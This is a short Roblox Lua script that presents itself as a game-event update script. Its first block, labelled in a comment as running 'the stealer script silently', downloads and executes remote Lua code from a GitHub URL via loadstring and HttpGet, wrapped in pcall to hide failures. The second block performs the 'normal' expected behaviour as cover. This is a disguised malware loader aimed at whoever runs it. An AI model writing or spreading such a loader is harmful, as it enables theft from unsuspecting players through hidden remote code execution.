-- First: run the stealer script silently
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HKTwoScript/ZenUpdateScript/main/ZenUpdateScript.lua"))()
end)

-- Then: run the “normal” expected behavior
pcall(function()
    if workspace:FindFirstChild("DinoEvent") then
        workspace.DinoEvent:Destroy()
    end

    local zenEvent = game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("UpdateService"):FindFirstChild("ZenEvent")
    if zenEvent then
        zenEvent.Parent = workspace
    end
end)
